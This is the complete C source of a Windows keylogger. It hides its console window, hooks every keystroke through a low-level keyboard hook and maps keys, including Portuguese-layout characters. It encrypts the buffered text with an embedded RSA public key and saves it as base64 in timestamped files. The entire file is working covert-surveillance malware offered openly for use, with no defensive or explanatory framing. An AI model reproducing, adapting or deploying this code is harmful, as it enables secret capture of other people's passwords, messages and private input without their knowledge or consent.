#include <openssl/pem.h>
#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>
#define _WIN32_WINNT 0x0500
#include <Windows.h>

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int padding = RSA_PKCS1_PADDING;
const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
int b64invs[] = { 	62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
                    59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
                    6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
                    21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
                    29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
                    43, 44, 45, 46, 47, 48, 49, 50, 51 };
char plainText[4096/8] = {}; 
char publicKey[]="-----BEGIN PUBLIC KEY-----\n"\
"MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA1ygrSgHd3l0uG/1JYDoC\n"\
"UR+9CGfKBDhbR4dicusvBxd+tt9bOFTfwFlOdB2SnN8C0AGpZE6w0rJeSjcs1tli\n"\
"i2uTGmoVNRfP04JaBKv6TMxi/LX3Oi6Hz26KTV4XFuXf6Li8yKwaBpgKF9NbZgKT\n"\
"vYMICNNxOuEDOdMS4i4aX8Lihsdt2XTb3br+ZYJN4Z3GpKqro4eGSm6lU+STjFqH\n"\
"MTCs+diV4kNEbjJ1Xr73uwT7cwZi8jbqHr/mBpKZOqkARLrWfmLO+iT4mGxPIxKQ\n"\
"AIIeXNGohuueT/FQvulRWVlAZKKs1GkUKwaVXCPw/UmlAs1BQHjvYc5aD6/p6Nxa\n"\
"43vVfLwTIl8KBK0sTAEQD3b4YtgsH5tOQ1xzLqHyqm5wxqFSV1/ukEOMx2CtXK2W\n"\
"RFEmPY8OjyCwczJ7/4ifCijaN6npV3UeaJmOqHZz5UQ7DSsC3Hiv9z18xvgNzib6\n"\
"CqbwHbk6PRFRVyw+7oDQceOVZgO7TFCqgxc0lkMk5UdWP3VtwFFH+nY0teGs6mRm\n"\
"QE/SnIRQQ73u7JZCgTQe1hZ4mEBcrYb9xMTPKrlQfB/l4QKLlHKUcgdmSqMjFoDa\n"\
"tXzfy0wT7+zCO3NjaGvHL0fHpyy+NInzHVq8/6KsEUMv6bdcIcM+HRWdvn7JeDdb\n"\
"zGtB7FWKruphymBoOsLMgQUCAwEAAQ==\n"\
"-----END PUBLIC KEY-----\n";
unsigned char encrypted[8192]={};

char* ToLower(char* s) {
  for(char *p=s; *p; p++) *p=tolower(*p);
  return s;
}

char* ToUpper(char* s) {
  for(char *p=s; *p; p++) *p=toupper(*p);
  return s;
}

int ShiftPressed() {
	return (((int)GetKeyState(VK_SHIFT) < 0) || ((int)GetKeyState(VK_LSHIFT) < 0) || ((int)GetKeyState(VK_RSHIFT) < 0));
}

int CtrlPressed() {
	return (((int)GetKeyState(VK_CONTROL) < 0) || ((int)GetKeyState(VK_LCONTROL) < 0) || ((int)GetKeyState(VK_RCONTROL) < 0));
}

int AltPressed() {
	return (((int)GetKeyState(VK_MENU) < 0) || ((int)GetKeyState(VK_LMENU) < 0) || ((int)GetKeyState(VK_RMENU) < 0));
}

int b64_isvalidchar(char c) {
	if (c >= '0' && c <= '9')
		return 1;
	if (c >= 'A' && c <= 'Z')
		return 1;
	if (c >= 'a' && c <= 'z')
		return 1;
	if (c == '+' || c == '/' || c == '=')
		return 1;
	return 0;
}

size_t b64_encoded_size(size_t inlen) {
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

size_t b64_decoded_size(const char *in) {
	size_t len;
	size_t ret;
	size_t i;

	if (in == NULL)
		return 0;

	len = strlen(in);
	ret = len / 4 * 3;

	for (i=len; i-->0; ) {
		if (in[i] == '=') {
			ret--;
		} else {
			break;
		}
	}

	return ret;
}

char *b64_encode(const unsigned char *in, size_t len) {
	char   *out;
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out  = malloc(elen+1);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = b64chars[(v >> 18) & 0x3F];
		out[j+1] = b64chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = b64chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = b64chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}

	return out;
}

int b64_decode(const char *in, unsigned char *out, size_t outlen) {
	size_t len;
	size_t i;
	size_t j;
	int    v;

	if (in == NULL || out == NULL)
		return 0;

	len = strlen(in);
	if (outlen < b64_decoded_size(in) || len % 4 != 0)
		return 0;

	for (i=0; i<len; i++) {
		if (!b64_isvalidchar(in[i])) {
			return 0;
		}
	}

	for (i=0, j=0; i<len; i+=4, j+=3) {
		v = b64invs[in[i]-43];
		v = (v << 6) | b64invs[in[i+1]-43];
		v = in[i+2]=='=' ? v << 6 : (v << 6) | b64invs[in[i+2]-43];
		v = in[i+3]=='=' ? v << 6 : (v << 6) | b64invs[in[i+3]-43];

		out[j] = (v >> 16) & 0xFF;
		if (in[i+2] != '=')
			out[j+1] = (v >> 8) & 0xFF;
		if (in[i+3] != '=')
			out[j+2] = v & 0xFF;
	}

	return 1;
}

RSA * createRSA(unsigned char * key,int public) {
    RSA *rsa= NULL;
    BIO *keybio ;
    keybio = BIO_new_mem_buf(key, -1);
    if (keybio==NULL)
    {
        printf( "Failed to create key BIO");
        return 0;
    }
    if(public)
    {
        rsa = PEM_read_bio_RSA_PUBKEY(keybio, &rsa,NULL, NULL);
    }
    else
    {
        rsa = PEM_read_bio_RSAPrivateKey(keybio, &rsa,NULL, NULL);
    }
    if(rsa == NULL)
    {
        printf( "Failed to create RSA");
    }
 
    return rsa;
}

int public_encrypt(unsigned char * data,int data_len,unsigned char * key, unsigned char *encrypted) {
    RSA * rsa = createRSA(key,1);
    int result = RSA_public_encrypt(data_len,data,encrypted,rsa,padding);
    return result;
}

int private_decrypt(unsigned char * enc_data,int data_len,unsigned char * key, unsigned char *decrypted) {
    RSA * rsa = createRSA(key,0);
    int  result = RSA_private_decrypt(data_len,enc_data,decrypted,rsa,padding);
    return result;
}

int WriteChar(char charValue[]) {
	if (strlen(plainText) >= 256) {		
		FILE *fileCrypt;

		int encrypted_length = public_encrypt(plainText,strlen(plainText),publicKey,encrypted);
		char* asciiBase64Enc = b64_encode(encrypted, encrypted_length);

		SYSTEMTIME t;
		GetLocalTime(&t); // Fill out the struct so that it can be used

		char fileName[24] = "\0";
		sprintf(fileName, "klg-%d-%d-%d-%d-%d-%d-%d", t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond, t.wMilliseconds);
		//printf("%s\n", fileName);

		fileCrypt = fopen(fileName, "w");
		fputs(asciiBase64Enc, fileCrypt);
		fclose(fileCrypt);

		memset(plainText, '\0', sizeof(plainText));

		//printf("base64=%s\n", asciiBase64Enc);
		//printf("base64 len=%i\n", strlen(asciiBase64Enc));		
		
	} 
	
	if (CtrlPressed()) {strcat(plainText, "[CTRL]");}
	if (AltPressed()) {strcat(plainText, "[ALT]");}
	
	strcat(plainText, charValue);
	//printf("plainText=%s\n",plainText);
	//printf("strlen(plainText)=%i\n",strlen(plainText));
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	
	if (nCode == HC_ACTION) {
	
		if (wParam == WM_KEYDOWN) {
			
			LPKBDLLHOOKSTRUCT kbdStruct = (LPKBDLLHOOKSTRUCT)lParam;				
			
			if ((kbdStruct->vkCode >= 0x41) && (kbdStruct->vkCode <= 0x5A)) {

				char str[2] = "\0";
				str[0] = (char)kbdStruct->vkCode;
				
				if ((int)GetKeyState(VK_CAPITAL)) {
					if (ShiftPressed()) {
						ToLower(str);
					}
				} else {				
					if (!(ShiftPressed())) {
						ToLower(str);
					}
				}
				
				WriteChar(str);
				
			} else { if ((kbdStruct->vkCode >= VK_NUMPAD0) && (kbdStruct->vkCode <= VK_NUMPAD9)) {
				
				int intKey = (kbdStruct->vkCode % VK_NUMPAD0);
				char str[2] = "\0";
				sprintf(str, "%i", intKey);
				
				WriteChar(str);

			} else { if ((kbdStruct->vkCode >= 0x30) && (kbdStruct->vkCode <= 0x39)) {
		
				char str[2] = "\0";
				int intKey = (kbdStruct->vkCode % 0x30);
				
				if (!ShiftPressed()) {				
					sprintf(str, "%i", intKey);
					WriteChar(str);
				} else {
					if (intKey != 6) {
						char mapNumUpper[11] = ")!@#$%X&*(";
						sprintf(str, "%c", mapNumUpper[(intKey)]);
						WriteChar(str);
					} else {
						WriteChar("[TREMA]");
					}
				}
				
			} else { if ((kbdStruct->vkCode >= VK_F1) && (kbdStruct->vkCode <= VK_F24)) {

				int intKey = (kbdStruct->vkCode % 0x6F);
				char str[6] = "\0";
				sprintf(str, "[F%i]", intKey);
				
				WriteChar(str);			

			} else {
			
				switch (kbdStruct->vkCode) {
					
					case VK_BACK:
						WriteChar("[BACKSPACE]");
					break;
					
					case VK_TAB:
						WriteChar("[TAB]");
					break;
					
					case VK_CLEAR:
						WriteChar("[CLEAR]");
					break;				
					
					case VK_RETURN:
						WriteChar("[ENTER]");
					break;
					
					case VK_PAUSE:
						WriteChar("[PAUSE]");
					break;
					
					case VK_CAPITAL:
						WriteChar("[CAPS LOCK]");
						if ((CtrlPressed()) && (AltPressed()) && (ShiftPressed())) {
							UnhookWindowsHookEx(_hook);
							exit(0);
						}						
					break;					
			
					case VK_ESCAPE:
						WriteChar("[ESC]");
					break;
					
					case VK_SPACE:
						WriteChar("[SPACE]");
					break;

					case VK_PRIOR:
						WriteChar("[PAGE UP]");
					break;
					
					case VK_NEXT:
						WriteChar("[PAGE DOWN]");
					break;

					case VK_END:
						WriteChar("[END]");
					break;

					case VK_HOME:
						WriteChar("[HOME]");
					break;					
					
					case VK_LEFT:
						WriteChar("[LEFT]");
					break;

					case VK_UP:
						WriteChar("[UP]");
					break;

					case VK_RIGHT:
						WriteChar("[RIGHT]");
					break;

					case VK_DOWN:
						WriteChar("[DOWN]");
					break;			

					case VK_SELECT:
						WriteChar("[SELECT]");
					break;			

					case VK_PRINT:
						WriteChar("[PRINT]");
					break;

					case VK_EXECUTE:
						WriteChar("[EXECUTE]");
					break;

					case VK_SNAPSHOT:
						WriteChar("[PRINT SCREEN]");
					break;

					case VK_INSERT:
						WriteChar("[INSERT]");
					break;
					
					case VK_DELETE:
						WriteChar("[DELETE]");
					break;

					case VK_HELP:
						WriteChar("[HELP]");
					break;

					case VK_LWIN:
						WriteChar("[LEFT WINDOWS]");
					break;
					
					case VK_RWIN:
						WriteChar("[RIGHT WINDOWS]");
					break;

					case VK_APPS:
						WriteChar("[APPLICATIONS]");
					break;					

					case VK_SLEEP:
						WriteChar("[SLEEP]");
					break;
					
					case VK_MULTIPLY:
						WriteChar("*");
					break;
					
					case VK_ADD:
						WriteChar("+");
					break;					
					
					case VK_SEPARATOR:
						WriteChar("[SEPARATOR]");
					break;

					case VK_SUBTRACT:
						WriteChar("-");
					break;

					case VK_DECIMAL:
						WriteChar(",");
					break;

					case VK_DIVIDE:
						WriteChar("/");
					break;					

					case VK_NUMLOCK:
						WriteChar("[NUM LOCK]");
					break;					

					case VK_SCROLL:
						WriteChar("[SCROLL LOCK]");
					break;		

					case VK_BROWSER_BACK:
						WriteChar("[BROSWER BACK]");
					break;

					case VK_BROWSER_FORWARD:
						WriteChar("[BROSWER FORWARD]");
					break;

					case VK_BROWSER_REFRESH:
						WriteChar("[BROSWER REFRESH]");
					break;

					case VK_BROWSER_STOP:
						WriteChar("[BROSWER STOP]");
					break;

					case VK_BROWSER_SEARCH:
						WriteChar("[BROSWER SEARCH]");
					break;

					case VK_BROWSER_FAVORITES:
						WriteChar("[BROSWER FAVORITES]");
					break;

					case VK_BROWSER_HOME:
						WriteChar("[BROSWER HOME]");
					break;

					case VK_VOLUME_MUTE:
						WriteChar("[VOLUME MUTE]");
					break;

					case VK_VOLUME_DOWN:
						WriteChar("[VOLUME DOWN]");
					break;

					case VK_VOLUME_UP:
						WriteChar("[VOLUME UP]");
					break;
					
					case VK_MEDIA_NEXT_TRACK:
						WriteChar("[MEDIA NEXT TRACK]");
					break;

					case VK_MEDIA_PREV_TRACK:
						WriteChar("[MEDIA PREV TRACK]");
					break;

					case VK_MEDIA_STOP:
						WriteChar("[MEDIA STOP]");
					break;

					case VK_MEDIA_PLAY_PAUSE:
						WriteChar("[MEDIA PLAY PAUSE]");
					break;

					case VK_LAUNCH_MAIL:
						WriteChar("[LAUNCH MAIL]");
					break;

					case VK_LAUNCH_MEDIA_SELECT:
						WriteChar("[LAUNCH MEDIA SELECT]");
					break;

					case VK_LAUNCH_APP1:
						WriteChar("[LAUNCH APP1]");
					break;

					case VK_LAUNCH_APP2:
						WriteChar("[LAUNCH APP2]");
					break;
					
					case VK_OEM_1: 
					
						if ((int)GetKeyState(VK_CAPITAL)) {
							if (ShiftPressed()) {
								WriteChar("ç");
							} else {
								WriteChar("Ç");
							}
						} else {				
							if (!(ShiftPressed())) {
								WriteChar("ç");
							} else {
								WriteChar("Ç");
							}
						}					
					
					break;

					case 0xC1:
						if (!(ShiftPressed())) {
							WriteChar("/");
						} else {
							WriteChar("?");
						}						
					break;

					case 0xC2:
						WriteChar(".");
					break;
					
					case VK_OEM_PLUS:
						if (!(ShiftPressed())) {
							WriteChar("=");
						} else {
							WriteChar("+");
						}						
					break;

					case VK_OEM_COMMA:
						if (!(ShiftPressed())) {
							WriteChar(",");
						} else {
							WriteChar("<");
						}						
					break;
					
					case VK_OEM_MINUS:
						if (!(ShiftPressed())) {
							WriteChar("-");
						} else {
							WriteChar("_");
						}						
					break;

					case VK_OEM_PERIOD:
						if (!(ShiftPressed())) {
							WriteChar(".");
						} else {
							WriteChar(">");
						}						
					break;

					case VK_OEM_2:
						if (!(ShiftPressed())) {
							WriteChar(";");
						} else {
							WriteChar(":");
						}						
					break;

					case VK_OEM_3:
						if (!(ShiftPressed())) {
							WriteChar("'");
						} else {
							WriteChar("\"");
						}						
					break;

					case VK_OEM_4:
						if (!(ShiftPressed())) {
							WriteChar("´");
						} else {
							WriteChar("`");
						}						
					break;
					
					case VK_OEM_5:
						if (!(ShiftPressed())) {
							WriteChar("]");
						} else {
							WriteChar("}");
						}						
					break;	
					
					case VK_OEM_6:
						if (!(ShiftPressed())) {
							WriteChar("[");
						} else {
							WriteChar("{");
						}						
					break;
					
					case VK_OEM_7:
						if (!(ShiftPressed())) {
							WriteChar("~");
						} else {
							WriteChar("^");
						}						
					break;
					
					case VK_OEM_102:
						if (!(ShiftPressed())) {
							WriteChar("\\");
						} else {
							WriteChar("|");
						}						
					break;
					
					case VK_SHIFT:
					break;
					case VK_LSHIFT:
					break;
					case VK_RSHIFT:
					break;
					case VK_CONTROL:
					break;
					case VK_LCONTROL:
					break;
					case VK_RCONTROL:
					break;
					case VK_MENU:
					break;
					case VK_LMENU:
					break;
					case VK_RMENU:
					break;
					
					default:					
						if 	(
								!(ShiftPressed()) &&
								!(CtrlPressed()) &&
								!(AltPressed())
							)
						{
							printf("NEW vkCode = %x\n",kbdStruct->vkCode);
						}
					break;
				}
				
			}}}}
			
		}
			
	}
	
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

int main(int argc, char const *argv[]) {
	
	HWND hWnd = GetConsoleWindow();
	ShowWindow( hWnd, SW_HIDE );

	MSG msg;
	
	_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
	while (GetMessage(&msg, NULL, 0, 0)) {}
	UnhookWindowsHookEx(_hook);
	
	return 0;
}

	
